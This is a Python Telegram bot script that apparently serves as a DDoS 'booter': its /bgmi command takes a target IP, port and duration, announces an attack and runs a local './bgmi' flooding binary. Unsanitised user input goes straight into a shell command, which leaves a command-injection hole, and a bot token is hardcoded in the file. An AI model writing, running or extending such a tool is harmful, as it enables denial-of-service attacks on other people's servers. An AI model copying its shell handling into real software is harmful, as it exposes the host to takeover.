#!/usr/bin/python3

import telebot
import subprocess

# Insert your Telegram bot token here
bot = telebot.TeleBot('7073204909:AAHtrbmX-dijQy2SC_OV7FmCVJleJcZQXsA')

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    command = message.text.split()
    if len(command) == 4:  # Accept target, port, and time
        target = command[1]
        port = int(command[2])  # Convert port to integer
        time = int(command[3])  # Convert time to integer
        
        if time > 181:
            response = "Error: Time interval must be less than 181."
        else:
            start_attack_reply(message, target, port, time)  # Call start_attack_reply function
            full_command = f"./bgmi {target} {port} {time} 200"
            subprocess.run(full_command, shell=True)  # Run the command in the shell
            response = f"BGMI Attack Finished. Target: {target} Port: {port} Time: {time} seconds."
    else:
        response = '''Usage: /bgmi <target> <port> <time>
Example: /bgmi 192.168.1.1 80 60
'''
    bot.reply_to(message, response)

# Function to handle the reply when users run the /bgmi command
def start_attack_reply(message, target, port, time):
    response = f"𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: BGMI\nBy ABDEKHTU"
    bot.reply_to(message, response)

# Command handler for /help
@bot.message_handler(commands=['help'])
def handle_help(message):
    response = '''Available commands:
    
/bgmi <target> <port> <time> - Start BGMI attack
'''
    bot.reply_to(message, response)

# Start the bot
bot.polling()
